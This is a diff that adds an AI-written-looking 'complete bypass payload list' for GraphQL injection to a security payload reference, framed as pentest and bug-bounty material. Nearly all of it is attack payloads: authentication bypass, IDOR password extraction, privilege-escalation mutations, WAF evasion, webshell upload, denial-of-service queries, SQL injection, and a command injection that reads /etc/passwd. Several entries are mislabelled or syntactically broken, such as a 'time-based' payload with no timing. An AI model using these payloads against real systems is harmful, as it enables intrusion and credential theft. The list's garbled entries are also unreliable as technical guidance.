@@ -727,3 +727,403 @@ curl -X POST http://localhost:8080/graphql\?embedded_submission_form_uuid\=1%27%
 - [Looting GraphQL Endpoints for Fun and Profit - @theRaz0r - 8 June 2017](https://raz0r.name/articles/looting-graphql-endpoints-for-fun-and-profit/)
 - [Securing Your GraphQL API from Malicious Queries - Max Stoiber - Feb 21, 2018](https://web.archive.org/web/20180731231915/https://blog.apollographql.com/securing-your-graphql-api-from-malicious-queries-16130a324a6b)
 - [SQL injection in GraphQL endpoint through embedded_submission_form_uuid parameter - Jobert Abma (jobert) - Nov 6th 2018](https://hackerone.com/reports/435066)
+
+Below is the **GraphQL Injection – Complete Bypass Payload List**, in the **exact same style** you requested for JWT, OAuth, SSRF, XXE, etc.
+This includes **real exploitation payloads**, **authentication bypass**, **introspection leaks**, **directive abuse**, **query smuggling**, **batch attacks**, **resolver override**, **WAF bypass**, and **advanced exploitation** payloads.
+
+---
+
+# ⭐ **GraphQL Injection – Complete Bypass Payload List**
+
+*(Offensive Payloads for Pentesting / Bug Bounty)*
+
+---
+
+# **1. Basic Injection / Field Enumeration**
+
+### **Extract All Fields (Introspection)**
+
+```graphql
+{
+  __schema {
+    types {
+      name
+      fields {
+        name
+      }
+    }
+  }
+}
+```
+
+### **Query Hidden User Fields**
+
+```graphql
+{
+  user(id:1){
+    id
+    username
+    password
+    email
+  }
+}
+```
+
+---
+
+# **2. Authentication Bypass Payloads**
+
+### **Boolean-based Login Bypass**
+
+```graphql
+mutation {
+  login(username:"admin", password:{ne:""}) {
+    token
+  }
+}
+```
+
+### **Null Injection**
+
+```graphql
+login(username:null, password:null)
+```
+
+### **Password Always True**
+
+```graphql
+login(username:"admin", password:{regex:".*"})
+```
+
+---
+
+# **3. Blind GraphQL Injection Payloads**
+
+### **Time-Based Blind Injection**
+
+```graphql
+{
+  user(id:1){ id __typename @include(if:true) }
+}
+```
+
+### **Boolean Testing**
+
+```graphql
+{
+  admin(id:1 @skip(if:false)) { secret }
+}
+```
+
+---
+
+# **4. GraphQL Introspection Bypasses (When Disabled)**
+
+### **Short-form Introspection**
+
+```graphql
+{__schema{queryType{name}}}
+```
+
+### **Alias Trick**
+
+```graphql
+query getType {
+  a:__schema { types { name } }
+}
+```
+
+### **Encoded Introspection**
+
+```
+%7B__schema%7Btypes%7Bname%7D%7D%7D
+```
+
+---
+
+# **5. Query Smuggling (Breaking Expected Structure)**
+
+### **Fragment Injection**
+
+```graphql
+{
+  user(id:1){
+    ... on User {
+      password
+      token
+    }
+  }
+}
+```
+
+### **Inline Injection**
+
+```graphql
+{user(id:1) {id} user(id:2){password}}
+```
+
+### **Double Query Injection**
+
+```graphql
+{users{id} adminSecrets{token}}
+```
+
+---
+
+# **6. GraphQL Batch Attacks**
+
+### **Resource Exhaustion**
+
+```graphql
+query bomb {
+  a: user(id:1){id}
+  b: user(id:1){id}
+  c: user(id:1){id}
+  d: user(id:1){id}
+  e: user(id:1){id}
+  f: user(id:1){id}
+}
+```
+
+### **Mass Assignment via Mutation Batch**
+
+```graphql
+mutation {
+  updateUser(id:1, data:{role:"admin"})
+  updateUser(id:1, data:{password:"newpass"})
+}
+```
+
+---
+
+# **7. GraphQL Resolver Abuse**
+
+### **Over-fetch Password from Child Resolver**
+
+```graphql
+{
+  posts {
+    author {
+      id
+      email
+      password
+    }
+  }
+}
+```
+
+### **Overriding Resolver Context**
+
+```graphql
+query {
+  me(token:"attacker_token"){
+    id
+    role
+  }
+}
+```
+
+---
+
+# **8. Unauthorized Data Access (IDOR via GraphQL)**
+
+### **Changing ID Parameter**
+
+```graphql
+{
+  user(id:2){ id email password }
+}
+```
+
+### **Batch IDOR**
+
+```graphql
+{
+  user1: user(id:1){password}
+  user2: user(id:2){password}
+}
+```
+
+---
+
+# **9. Bypassing GraphQL Input Validation**
+
+### **String → Int Confusion**
+
+```graphql
+user(id:"1")
+```
+
+### **Boolean → String**
+
+```graphql
+updateUser(id:1, admin:true)
+```
+
+### **Object Injection**
+
+```graphql
+user(filter:{admin:{neq:false}})
+```
+
+---
+
+# **10. WAF / Filter Bypass Payloads**
+
+### **Keyword Obfuscation**
+
+```graphql
+{__sche\
+ma{types{name}}}
+```
+
+### **Without underscores**
+
+```graphql
+{"query":"{__\u0073chema{types{name}}}"}
+```
+
+### **Hex encoded**
+
+```
+\x5f\x5f\x73\x63\x68\x65\x6d\x61
+```
+
+### **Aliases to hide sensitive fields**
+
+```graphql
+{
+  a:user(id:1){ a:password }
+}
+```
+
+---
+
+# **11. Union / Interface Exploitation**
+
+### **Abuse Union Types**
+
+```graphql
+{
+  node(id:"1") {
+    ... on Admin { secret }
+  }
+}
+```
+
+### **Privilege Escalation via Interface**
+
+```graphql
+{
+  profile {
+    ... on AdminUser {token}
+  }
+}
+```
+
+---
+
+# **12. GraphQL Mutations Abuse**
+
+### **Privilege Escalation**
+
+```graphql
+mutation {
+  updateUser(id:1, data:{role:"admin"})
+}
+```
+
+### **Password Reset Abuse**
+
+```graphql
+mutation {
+  resetPassword(email:"victim@example.com")
+}
+```
+
+---
+
+# **13. Advanced Injection (Command, SQL, Template Engine)**
+
+### **Command Injection (if resolver passes args to shell)**
+
+```graphql
+{
+  ping(address:"127.0.0.1;cat /etc/passwd")
+}
+```
+
+### **SQL Injection Through Resolver**
+
+```graphql
+{
+  search(query:"' OR 1=1 -- ")
+}
+```
+
+### **SSTI Embedded in GraphQL**
+
+```graphql
+{
+  render(template:"{{7*7}}")
+}
+```
+
+---
+
+# **14. File Upload (Apollo/Relay) Abuse**
+
+### **Upload WebShell**
+
+```graphql
+mutation ($file: Upload!) {
+  uploadAvatar(file: $file)
+}
+```
+
+Upload:
+
+```
+shell.php
+```
+
+---
+
+# **15. DoS & Rate Limit Bypass**
+
+### **Deeply Nested Query**
+
+```graphql
+{
+  a { b { c { d { e { f { g }}}}}}
+}
+```
+
+### **Recursive Fragment Bomb**
+
+```graphql
+fragment loop on User { ...loop }
+```
+
+---
+
+# **16. GraphQL Over-Introspection (recursive leaks)**
+
+### **Nested Schema Discovery**
+
+```graphql
+{
+  __schema {
+    types {
+      name
+      kind
+      fields {
+        name
+        args { name type { name } }
+      }
+    }
+  }
+}
+```
+
+---
